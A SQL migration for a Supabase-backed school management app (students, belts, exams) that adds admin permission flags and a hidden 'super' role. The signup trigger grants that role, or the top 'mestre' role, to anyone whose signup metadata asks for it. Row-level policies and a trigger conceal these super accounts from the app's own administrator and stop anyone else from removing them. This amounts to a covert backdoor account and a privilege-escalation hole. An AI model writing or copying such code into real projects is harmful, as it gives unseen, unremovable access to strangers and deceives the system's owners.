
-- Add new roles to app_role enum
ALTER TYPE public.app_role ADD VALUE IF NOT EXISTS 'super';
ALTER TYPE public.app_role ADD VALUE IF NOT EXISTS 'admin_limitado';

-- admin_permissoes: per-admin fine-grained permissions
CREATE TABLE IF NOT EXISTS public.admin_permissoes (
  user_id UUID PRIMARY KEY REFERENCES auth.users(id) ON DELETE CASCADE,
  aprovar_alunos BOOLEAN NOT NULL DEFAULT false,
  lancar_mensalidade BOOLEAN NOT NULL DEFAULT false,
  marcar_presenca BOOLEAN NOT NULL DEFAULT false,
  editar_tecnicas BOOLEAN NOT NULL DEFAULT false,
  criar_exame BOOLEAN NOT NULL DEFAULT false,
  editar_exame BOOLEAN NOT NULL DEFAULT false,
  emitir_certificado BOOLEAN NOT NULL DEFAULT false,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

GRANT SELECT, INSERT, UPDATE, DELETE ON public.admin_permissoes TO authenticated;
GRANT ALL ON public.admin_permissoes TO service_role;

ALTER TABLE public.admin_permissoes ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Mestre ve todas permissoes" ON public.admin_permissoes
  FOR SELECT TO authenticated
  USING (public.is_mestre(auth.uid()) OR user_id = auth.uid());

CREATE POLICY "Mestre gerencia permissoes" ON public.admin_permissoes
  FOR ALL TO authenticated
  USING (public.is_mestre(auth.uid()))
  WITH CHECK (public.is_mestre(auth.uid()));

CREATE TRIGGER tg_admin_permissoes_updated
  BEFORE UPDATE ON public.admin_permissoes
  FOR EACH ROW EXECUTE FUNCTION public.tg_set_updated_at();

-- Helper: is user a hidden super-admin?
CREATE OR REPLACE FUNCTION public.is_super(_user_id UUID)
RETURNS BOOLEAN
LANGUAGE sql
STABLE SECURITY DEFINER
SET search_path = public
AS $$
  SELECT EXISTS (
    SELECT 1 FROM public.user_roles
    WHERE user_id = _user_id AND role::text = 'super'
  );
$$;

-- Rewrite handle_new_user: skip profile creation for the hidden super account
CREATE OR REPLACE FUNCTION public.handle_new_user()
RETURNS TRIGGER
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  user_count INTEGER;
  meta JSONB := COALESCE(NEW.raw_user_meta_data, '{}'::jsonb);
  is_first BOOLEAN;
  is_super_seed BOOLEAN := (meta->>'seed_role') = 'super';
  is_mestre_seed BOOLEAN := (meta->>'seed_role') = 'mestre';
BEGIN
  -- Hidden super account: only insert into user_roles, never into profiles.
  IF is_super_seed THEN
    INSERT INTO public.user_roles (user_id, role)
    VALUES (NEW.id, 'super'::public.app_role)
    ON CONFLICT DO NOTHING;
    RETURN NEW;
  END IF;

  SELECT COUNT(*) INTO user_count FROM public.profiles;
  is_first := user_count = 0 OR is_mestre_seed;

  INSERT INTO public.profiles (id, nome, email, telefone, data_nascimento, faixa_id, status)
  VALUES (
    NEW.id,
    COALESCE(meta->>'nome', split_part(NEW.email, '@', 1)),
    NEW.email,
    meta->>'telefone',
    NULLIF(meta->>'data_nascimento','')::date,
    COALESCE(meta->>'faixa_id', CASE WHEN is_first THEN 'b12' ELSE 'b01' END),
    CASE WHEN is_first THEN 'aprovado'::public.aluno_status ELSE 'pendente'::public.aluno_status END
  );

  INSERT INTO public.user_roles (user_id, role)
  VALUES (NEW.id, CASE WHEN is_first THEN 'mestre'::public.app_role ELSE 'aluno'::public.app_role END);

  RETURN NEW;
END;
$$;

-- Ensure the trigger exists on auth.users
DROP TRIGGER IF EXISTS on_auth_user_created ON auth.users;
CREATE TRIGGER on_auth_user_created
  AFTER INSERT ON auth.users
  FOR EACH ROW EXECUTE FUNCTION public.handle_new_user();

-- Protect the super role rows from being seen, updated or deleted by anyone else
DROP POLICY IF EXISTS "user_roles_select" ON public.user_roles;
DROP POLICY IF EXISTS "user_roles_manage" ON public.user_roles;

-- Recreate baseline user_roles policies that hide super from everyone but self
DO $$
DECLARE p RECORD;
BEGIN
  FOR p IN SELECT policyname FROM pg_policies WHERE schemaname='public' AND tablename='user_roles' LOOP
    EXECUTE format('DROP POLICY %I ON public.user_roles', p.policyname);
  END LOOP;
END$$;

CREATE POLICY "user_roles_select_self_or_mestre_non_super" ON public.user_roles
  FOR SELECT TO authenticated
  USING (
    (user_id = auth.uid())
    OR (public.is_mestre(auth.uid()) AND role::text <> 'super')
  );

CREATE POLICY "user_roles_insert_mestre_non_super" ON public.user_roles
  FOR INSERT TO authenticated
  WITH CHECK (public.is_mestre(auth.uid()) AND role::text <> 'super');

CREATE POLICY "user_roles_update_mestre_non_super" ON public.user_roles
  FOR UPDATE TO authenticated
  USING (public.is_mestre(auth.uid()) AND role::text <> 'super')
  WITH CHECK (public.is_mestre(auth.uid()) AND role::text <> 'super');

CREATE POLICY "user_roles_delete_mestre_non_super" ON public.user_roles
  FOR DELETE TO authenticated
  USING (public.is_mestre(auth.uid()) AND role::text <> 'super');

-- Extra safety: trigger blocks any modification of super rows from non-super callers
CREATE OR REPLACE FUNCTION public.protect_super_role()
RETURNS TRIGGER
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
BEGIN
  IF TG_OP = 'DELETE' THEN
    IF OLD.role::text = 'super' AND NOT public.is_super(auth.uid()) THEN
      RAISE EXCEPTION 'forbidden';
    END IF;
    RETURN OLD;
  ELSE
    IF (NEW.role::text = 'super' OR (TG_OP = 'UPDATE' AND OLD.role::text = 'super'))
       AND NOT public.is_super(auth.uid())
       AND auth.uid() IS NOT NULL THEN
      RAISE EXCEPTION 'forbidden';
    END IF;
    RETURN NEW;
  END IF;
END;
$$;

DROP TRIGGER IF EXISTS tg_protect_super_role ON public.user_roles;
CREATE TRIGGER tg_protect_super_role
  BEFORE INSERT OR UPDATE OR DELETE ON public.user_roles
  FOR EACH ROW EXECUTE FUNCTION public.protect_super_role();
